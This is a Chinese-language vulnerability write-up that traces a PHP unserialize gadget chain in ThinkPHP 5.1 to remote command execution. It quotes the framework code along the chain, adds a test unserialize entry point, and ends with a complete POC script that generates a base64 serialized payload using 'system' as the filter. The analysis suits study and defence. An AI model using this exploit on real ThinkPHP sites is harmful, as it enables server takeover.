**1.环境搭建**
使用composer创建项目，然后启动，访问即可。
`composer create-project topthink/think=5.1.* tp`
`cd tp`
`php think run --port=9000`
`127.0.0.1:9000`
**2.pop链**
起点依然是__destruct魔术方法，为/thinkphp/library/think/process/pipes/Windows.php下的__destruct()。
```php
public function __destruct()
    {
        $this->close();
        $this->removeFiles();
    }
```
跟进到removefiles()方法，这里的file_exists()会判断目录或文件是否存在，如果存在，@unlink()删除。$filename是可控的，如果我们让它为一个对象，在file_exists()方法进行时会触发__toString()魔术方法，
```php
private function removeFiles()
    {
        foreach ($this->files as $filename) {
            if (file_exists($filename)) {
                @unlink($filename);
            }
        }
        $this->files = [];
    }
```
接着寻找__toString()，找到\thinkphp\library\think\model\concern\Conversion.php下有__tostring()方法。
```php
public function __toString()
    {
        return $this->toJson();
    }
```
跟进toJson()方法。
```php
public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this->toArray(), $options);
    }
```
跟进toArray()方法。
```php
public function toArray()
    {
        $item       = [];
        $hasVisible = false;
        ···
        // 追加属性（必须定义获取器）
        if (!empty($this->append)) {
            foreach ($this->append as $key => $name) {
                if (is_array($name)) {
                    // 追加关联对象属性
                    $relation = $this->getRelation($key);

                    if (!$relation) {
                        $relation = $this->getAttr($key);
                        if ($relation) {
                            $relation->visible($name);
                        }
                    }
                }
            }
        }  
    }
```
这里的this->append可控，所以key和name也是可控的，如果`$relation`也可控的话我们就可以通过调用对象不可访问的方法触发__call()方法，跟进getRelation()方法，判断`$relation`是否可控。
```php
public function getRelation($name = null)
    {
        if (is_null($name)) {
            return $this->relation;
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        return;
    }
```
由于下面是`if(!$relation)`，所以可以让getRelation返回null，接着跟进getAttr()方法。
```php
public function getAttr($name, &$item = null)
    {
        try {
            $notFound = false;
            $value    = $this->getData($name);
        } catch (InvalidArgumentException $e) {
            $notFound = true;
            $value    = null;
        }
    }
```
跟进getData()方法。
```php
public function getData($name = null)
    {
        if (is_null($name)) {
            return $this->data;
        } elseif (array_key_exists($name, $this->data)) {
            return $this->data[$name];
        } elseif (array_key_exists($name, $this->relation)) {
            return $this->relation[$name];
        }
        throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
    }
```
这里我们看一下参数，`getRelation()`是可以绕过的，然后进入`getArry()`方法，接着getData()方法，在`toArry()`方法中是把key传给了`getArry()`，然后再传给`getData()`，进入第一个elseif，（这里我感觉是因为前面我们要绕过`getRelation()`方法，所以会让`$this->relation`为空最好，所以这里选择第一个elseif比较好），然后返回了`$this->data[$name]`，`$this->data`又是可控的，所以`$relation`是可控的。
但是我们`__toString()`方法是在Conversion类中，`getAttr()`方法是在Attribute类中，所以我们要找一个同时继承这两个类的。需要注意的一点是Attribute类的定义使用的是Trait而不是class。自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。
最终找到了Model类，但是他是抽象类，所以可以找一个他的子类，找到Pivot类。
下一步是去找`__call()`方法，找到了Request类。
```php
public function __call($method, $args)
    {
        if (array_key_exists($method, $this->hook)) {
            array_unshift($args, $this);
            return call_user_func_array($this->hook[$method], $args);
        }

        throw new Exception('method not exists:' . static::class . '->' . $method);
    }
```
这里的$method是visable，$args是之前的$name可控，但是array_unshift($args, $this)，把$this插到了$args的最前面，使得system的第一个参数不可控，没法直接system。
在Thinkphp的Request类中还有一个功能filter功能，事实上Thinkphp多个RCE都与这个功能有关。我们可以尝试覆盖filter的方法去执行代码。
```php
private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);
        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {
                if (false !== strpos($filter, '/')) {
                    // 正则过滤
                    if (!preg_match($filter, $value)) {
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {
                    // filter函数不存在时, 则使用filter_var进行过滤
                    // filter为非整形值时, 调用filter_id取得过滤id
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }
        return $value;
    }
```
这里的$value不可控，我们要找一个方法去控制$value，这里用input()方法。
```php
public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if (false === $name) {
            // 获取原始数据
            return $data;
        }

        $name = (string) $name;
        if ('' != $name) {
            // 解析name
            if (strpos($name, '/')) {
                list($name, $type) = explode('/', $name);
            }

            $data = $this->getData($data, $name);

            if (is_null($data)) {
                return $default;
            }

            if (is_object($data)) {
                return $data;
            }
        }

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            if (version_compare(PHP_VERSION, '7.1.0', '<')) {
                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
                $this->arrayReset($data);
            }
        } else {
            $this->filterValue($data, $name, $filter);
        }

        if (isset($type) && $data !== $default) {
            // 强制类型转换
            $this->typeCast($data, $type);
        }

        return $data;
    }
```
可以看到用getFilter()去获得$filter，然后再用array_walk-recursive()去回调filterValue()。
跟进一下getFilter()方法。
```php
protected function getFilter($filter, $default)
    {
        if (is_null($filter)) {
            $filter = [];
        } else {
            $filter = $filter ?: $this->filter;
            if (is_string($filter) && false === strpos($filter, '/')) {
                $filter = explode(',', $filter);
            } else {
                $filter = (array) $filter;
            }
        }

        $filter[] = $default;

        return $filter;
    }
```
可以发现$filter是可控的。接着我们去看$data是否可控，如果可控，$name为空的话，input()前面那些就可以绕过。这里发现param()方法。
```php
public function param($name = '', $default = null, $filter = '')
    {
        if (!$this->mergeParam) {
            $method = $this->method(true);

            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = [];
            }

            // 当前请求参数和URL地址中的参数合并
            $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

            $this->mergeParam = true;
        }

        if (true === $name) {
            // 获取包含文件上传信息的数组
            $file = $this->file();
            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;

            return $this->input($data, '', $default, $filter);
        }

        return $this->input($this->param, $name, $default, $filter);
    }
```
可以看到最后一行调用input()方法，$this->param是由本来的$this->param，还有请求参数和URL地址中的参数合并。这里可以直接构造$this->get(false)，通过get方式提交。接着寻找调用param()方法的，找到了isAjax()方法。
```php
public function isAjax($ajax = false)
    {
        $value  = $this->server('HTTP_X_REQUESTED_WITH');
        $result = 'xmlhttprequest' == strtolower($value) ? true : false;

        if (true === $ajax) {
            return $result;
        }

        $result = $this->param($this->config['var_ajax']) ? true : $result;
        $this->mergeParam = false;
        return $result;
    }
```
可以发现，`$this->config['var_ajax']`是配置文件中的值，只需要让他为空，那么他在调用`$this->param`时，默认的第一个参数`$name`就为空,之后再调用input时传入的$name就为空，从而绕过了input函数中的if判断。
最终的链子：`__call()`方法调用`return call_user_func_array($this->hook[$method], $args);`，让`$this->hook[$method]`的值为isAjax就调用了`isAjax()`函数，接着调用了`param()`函数,`param()`的最后一行调用了`input()`方法,`input()`中调用`array_walk_recursive`回调调用`filterValue()`函数，该函数中`call_user_func($filter, $value)`进行了命令执行，并通过最后的return返回。
**3.添加入口**
```php
$aa = base64_decode($_POST['aa']);
unserialize($aa);
```
在public/index.php中加上这两行。
**4.POC**
```php
<?php
namespace think\process\pipes;
use think\model\concern\Conversion;
use think\model\Pivot;
class Pipes
{
}
class Windows extends Pipes
{
    private $files = [];
    public function __construct(){
        $this->files = new Pivot();
    }
}

namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["Sentiment"=>["hello"]];
        $this->data = ["Sentiment"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>''];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}

namespace think\model;
use think\Model;
class Pivot extends Model
{
}

use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```
用get传入命令，用post传入对象即可。